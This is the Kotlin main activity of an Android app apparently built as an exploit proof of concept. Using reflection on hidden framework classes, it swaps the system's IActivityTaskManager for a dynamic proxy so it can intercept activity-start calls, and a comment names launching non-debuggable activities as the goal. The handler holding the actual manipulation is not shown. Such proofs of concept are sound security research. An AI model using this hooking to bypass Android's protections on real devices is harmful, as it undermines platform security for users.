package org.chickenhook.startflagexploit

import android.Manifest
import android.annotation.SuppressLint
import android.os.Bundle
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import java.lang.reflect.InvocationHandler
import java.lang.reflect.Proxy

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        hook()
        findViewById<Button>(R.id.start_button)?.setOnClickListener {
            /**
             * Launch any non debuggable activity.
             */
            ActivityCompat.requestPermissions(
                this@MainActivity,
                arrayOf(Manifest.permission.READ_CONTACTS),
                1001
            )
        }
    }

    @SuppressLint("BlockedPrivateApi", "PrivateApi")
    @Throws(Exception::class)
    private fun hook() {
        // get IActivityTaskManager instance
        val activityTaskManagerClazz =
            Class.forName("android.app.ActivityTaskManager")
        val getServiceMethod =
            activityTaskManagerClazz.getDeclaredMethod("getService")
        getServiceMethod.isAccessible = true
        val iActivityTaskManager = getServiceMethod.invoke(null)

        // get IActivityTaskManagerSingleton in IActivityTaskManager instance
        val iActivityTaskManagerSingletonField =
            activityTaskManagerClazz.getDeclaredField("IActivityTaskManagerSingleton")
        iActivityTaskManagerSingletonField.isAccessible = true
        val iActivityTaskManagerSingleton =
            iActivityTaskManagerSingletonField[iActivityTaskManager]

        // get original IActivityTaskManager in IActivityTaskManagerSingleton
        val singletonClazz = Class.forName("android.util.Singleton")
        val mInstanceField = singletonClazz.getDeclaredField("mInstance")
        mInstanceField.isAccessible = true

        // make dynamic proxy for IActivityTaskManager
        val iActivityTaskManagerClazz =
            Class.forName("android.app.IActivityTaskManager")
        val handler: InvocationHandler =
            AMSInvocationHandler(iActivityTaskManager)
        val mInstanceFieldProxy = Proxy.newProxyInstance(
            Thread.currentThread().contextClassLoader,
            arrayOf(iActivityTaskManagerClazz),
            handler
        )

        // set the variables that are proxied
        mInstanceField[iActivityTaskManagerSingleton] = mInstanceFieldProxy
    }
}
